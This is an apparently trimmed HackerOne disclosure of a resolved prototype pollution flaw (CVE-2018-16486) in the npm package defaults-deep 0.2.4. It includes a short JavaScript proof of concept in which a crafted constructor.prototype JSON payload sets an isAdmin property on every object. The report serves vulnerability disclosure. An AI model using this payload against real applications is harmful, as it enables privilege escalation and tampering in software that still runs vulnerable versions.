# [M] Prototype pollution attack (defaults-deep / constructor.prototype)

## Summary
Severity: Medium (CVSS 6.1)
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: asgerf
State: resolved
Disclosed: 2018-09-28T10:03:21.371Z
CVE: CVE-2018-16486
Source: https://hackerone.com/reports/380878

## Details
I would like to report a prototype pollution vulnerability in defaults-deep.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** defaults-deep
**version:** 0.2.4
**npm page:** `https://www.npmjs.com/package/defaults-deep`

## Module Description

Like `extend` but recursively copies only the missing properties/values to the target object.

## Module Stats

6,659 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `defaults-deep` package can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:

```javascript
var defaultsDeep = require('defaults-deep');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
defaultsDeep({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

_Trimmed to 38 lines — full report: https://hackerone.com/reports/380878_
